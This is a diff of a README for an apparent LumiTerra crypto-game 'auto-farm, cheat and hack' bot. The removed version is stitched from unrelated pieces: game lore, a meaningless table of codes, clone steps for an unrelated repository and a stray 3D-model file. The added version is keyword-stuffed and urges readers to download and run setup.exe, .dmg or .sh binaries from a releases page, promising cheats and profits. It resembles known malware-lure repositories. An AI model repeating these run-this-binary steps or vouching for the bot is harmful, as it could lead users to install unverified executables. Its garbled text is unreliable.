@@ -1,187 +1,82 @@
-<div align="center">
-<a href="z"><img src="https://img.shields.io/badge/ChatGPT-74aa9c?style=for-the-badge&logo=openai&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Bitcoin-000000?style=for-the-badge&logo=bitcoin&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Litecoin-A6A9AA?style=for-the-badge&logo=Litecoin&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/.NET-512BD4?style=for-the-badge&logo=dotnet&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white"/></a>
-</div>
+# 🌟 LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api - Automate Your LumiTerra Gameplay Effortlessly
 
-<h1 align="center">
-    <a href="https://amplication.com/#gh-light-mode-only">
-    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
-    </a>
-    <a href="https://amplication.com/#gh-dark-mode-only">
-    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
-    </a>
-</h1>
+[![Download Now](https://img.shields.io/badge/Download%20Now-Press%20Here-brightgreen)](https://github.com/Kyreclove/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases)
 
-<p align="center">
-  <i align="center">Building System Applications with C# & C++ 🚀</i>
-</p>
+## 📖 Description
+
+This application is a bot designed to automate various farming and clicker activities in the LumiTerra game. It helps players optimize their game performance with features like crypto token integration and API support. The bot includes options for cheats and hacks to maximize your profits and is managed conveniently via Telegram.
+
+## 🚀 Getting Started
+
+Follow these simple steps to download and run the LumiTerra Crypto Bot.
+
+1. Ensure you have basic software requirements installed on your device:
+   - Windows, macOS, or Linux operating system
+   - A stable internet connection
+   - Basic Telegram account to manage the bot
+
+2. **Visit the Releases page to download the bot.**
+
+   You can find the download link here: [Download Now](https://github.com/Kyreclove/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases)
+
+## 📥 Download & Install
+
+### Step 1: Download
+
+1. Click the link to visit the releases page: [Download Now](https://github.com/Kyreclove/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases).
+2. On the releases page, look for the latest version.
+3. Choose the appropriate installer for your operating system. Common files will be labeled with versions such as `setup.exe`, `setup.dmg`, or `setup.sh`.
+
+### Step 2: Install
+
+1. Once the file is downloaded, locate it in your downloads folder.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen instructions to complete the installation. This usually involves agreeing to terms and selecting an installation location.
+
+### Step 3: Configure the Bot
+
+1. Open the LumiTerra Crypto Bot.
+2. Connect the bot to your Telegram account by following the prompts. Make sure to have your Telegram app ready for setup.
+3. Set your preferences for farming and clicking activities. You can choose different game strategies based on your play style. 
+
+## 🛠 Features
+
+- **Automated Farming**: The bot can automate harvesting resources, ensuring you gather more while you focus on other tasks.
+- **Clicker Integration**: This feature boosts your clicking rate, allowing you to earn more in less time.
+- **Crypto Token Management**: Easily handle your cryptocurrency earnings and transactions directly through the bot.
+- **API Support**: Interact with the game’s API for enhanced functionalities, allowing for a more customizable experience.
+- **Telegram Management**: Control the bot via Telegram, making it easy to monitor and adjust settings on the go.
+
+## ⚙ System Requirements
+
+Before installing, ensure your system meets these requirements:
+
+- **Operating System**: 
+  - Windows 10 or later
+  - macOS Catalina or later
+  - Linux (Ubuntu 20.04 or later recommended)
   
-<p align="center">
-  Hi, I'm Mathieu 👋 I'm a 🚀 French developer 🚀 I ❤️ Happy Hardcore ❤️
-</p>
+- **Memory**: At least 4 GB RAM
+- **Storage**: 100 MB of free space required
+- **Internet Connection**: Stable connection recommended for optimal performance
 
-## Read About
-All game items are NFTs, and you can put them on-chain using the "box" item. The game features materials and crafted items ranging from Lv0 to Lv9, and different levels of game items require corresponding levels of boxes to be put on-chain.To ensure fairness, like the scenario of reputation and PvP, it takes 24 hours to put equipment/weapon on-chain, and LUAG(100) requires 120 hours. Some game items do not require a box to be put on-chain.Boxes are usually dropped in dungeons, and in Close Beta Test #1, there was an added opportunity to obtain them through daily tasks.
+## 💡 Tips for Using the Bot
 
-#### **Please Read First What You Need Part.**
-#### <p align="Left"><a href="#what-you-need-1">WHAT YOU NEED</a></p> 
+- **Start Slow**: If you are new to using bots, begin with basic settings. Observe how the bot performs before adjusting more advanced options.
+- **Monitor Performance**: Regularly check how the bot operates. Make adjustments as needed based on your gameplay and preferences.
+- **Stay Updated**: Keep an eye on updates in the releases section. New features and improvements are added regularly.
 
-![200](https://github.com/user-attachments/assets/9368e17a-7321-4006-b73b-92ebe07629f6)
+## 📞 Support
 
-https://github.com/user-attachments/assets/d2f09497-7c66-4273-94db-b0b82e009aad
+If you encounter issues or have questions:
 
+- Check the [GitHub Issues page](https://github.com/Kyreclove/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/issues) for common problems and solutions.
+- You can also reach out to the community on Telegram or contribute to the project discussions.
 
+## 📝 Community and Contributions
 
+Feel free to contribute to the project or engage with other users. Feedback is always welcome. Share your experiences, ideas for improvements, or any issues you've faced.
 
-```mermaid
-erDiagram
-    PLAYER_WALLET {
-        string id
-        string playerName
-        float inGameCurrency
-    }
-    PLAYER_WALLET ||--o{ GAME_TRANSACTION : initiates
-    PLAYER_WALLET ||--o{ GAME_BALANCE : updates
-    GAME_TRANSACTION ||--o{ GAME_CONFIRMATION : confirms
-    GAME_CONFIRMATION ||--o{ PLAYER_WALLET : updates
-    GAME_CONFIRMATION ||--o{ GAME_BLOCKCHAIN : records
-    GAME_BLOCKCHAIN }|--o{ GAME_TRANSACTION : contains
-    GAME_BLOCKCHAIN }|--o{ GAME_BALANCE : contains
-```
-### What You Need
-----
-                    
-| Tool              | Code         |
-| ----------------- | ------------ |
-| Blockchain Explorer | 0000       |
-| Cryptogame  | Daf     |
-| Farm      | 000          |
-| Auto Clicker  | ST8 |
-| Solana Explorer   | 91           |
+## 🚀 Conclusion
 
-                
-----
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-<!-- ROADMAP -->
-## Roadmap
-
-- [x] New Gui
-- [ ] Add back to top links
-- [x] Add Additional Templates w/ Examples
-- [x] New Features
-- [ ] Multi-language Support
-    - [ ] Chinese
-    - [ ] Turkish
-    - [ ] French
-    - [ ] Spanish
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-<!-- GETTING STARTED -->
-## Getting Started
-
-### Prerequisites
-
-This is an example of how to list things you need to use the software and how to install them.
-* npm
-  ```sh
-  npm install npm@latest -g
-  ```
-
-### Installation
-
-1. Download Visual Studio 2022
-_using Git Clone Or either download the project or exit the rar. Then Download Visual Studio 2022 Here Link [VisualStudio Download](https://visualstudio.microsoft.com/downloads/)_
-![last1](https://github.com/fikfifkasd/asd2342/assets/80986477/df0c0345-8a39-4bab-83ce-9211c8324283)
-> Download These
-
-2. Clone the repo
-   ```sh
-   git clone https://github.com/SoonAdd/Addsoon.git
-   ```
-3. OR
-
-![download](https://github.com/fikfifkasd/asd2342/assets/80986477/29a942a4-924c-4a97-9e76-99f49b7ec27a)
-
-
-4. _Then open the sln (Project Solution) file_
-
-![vsgif](https://github.com/fikfifkasd/asd2342/assets/80986477/e6351858-7564-4d41-adce-56b8ad70898c)
-
-5. Find Executable File
-   ```sh
-   /ProjectName/Bin/Debug/Executable.exe
-   ```
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-```stl
-solid cube_corner
-  facet normal 0.0 -1.0 0.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 1.0 0.0 0.0
-      vertex 0.0 0.0 1.0
-    endloop
-  endfacet
-  facet normal 0.0 0.0 -1.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 0.0 1.0 0.0
-      vertex 1.0 0.0 0.0
-    endloop
-  endfacet
-  facet normal -1.0 0.0 0.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 0.0 0.0 1.0
-      vertex 0.0 1.0 0.0
-    endloop
-  endfacet
-  facet normal 0.577 0.577 0.577
-    outer loop
-      vertex 1.0 0.0 0.0
-      vertex 0.0 1.0 0.0
-      vertex 0.0 0.0 1.0
-    endloop
-  endfacet
-endsolid
-```
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-<!-- CONTRIBUTING -->
-## Contributing
-<a href="https://opencollective.com/democracyearth/backer/0/website"><img src="https://opencollective.com/democracyearth/backer/0/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/1/website"><img src="https://opencollective.com/democracyearth/backer/1/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/2/website"><img src="https://opencollective.com/democracyearth/backer/2/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/3/website"><img src="https://opencollective.com/democracyearth/backer/3/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/4/website"><img src="https://opencollective.com/democracyearth/backer/4/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/5/website"><img src="https://opencollective.com/democracyearth/backer/5/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/6/website"><img src="https://opencollective.com/democracyearth/backer/6/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/7/website"><img src="https://opencollective.com/democracyearth/backer/7/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/8/website"><img src="https://opencollective.com/democracyearth/backer/8/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/9/website"><img src="https://opencollective.com/democracyearth/backer/9/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/10/website"><img src="https://opencollective.com/democracyearth/backer/10/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/11/website"><img src="https://opencollective.com/democracyearth/backer/11/avatar.svg"></a>
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-<p align="center">
-    <img src="https://minkxx-spotify-readme.vercel.app/api?theme=dark&rainbow=true&scan=true&spin=True" alt="Preview">
-</p>
-
-
-Not sure where to start? Join our discord and we will help you get started!
-
-<a href="https://discord.gg/U3UqGHxf"><img src="https://amplication.com/images/discord_banner_purple.svg" /></a>
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-<p align="center">
-  <img src="https://github.com/tarikmanoar/tarikmanoar/raw/output/github-snake-dark.svg" alt="snake"></center>
-</p>
+This bot opens doors to new possibilities in your LumiTerra gaming experience. Automate tasks, increase your profits, and enjoy the game more efficiently. Remember to have fun and explore all the features available to maximize your gameplay.
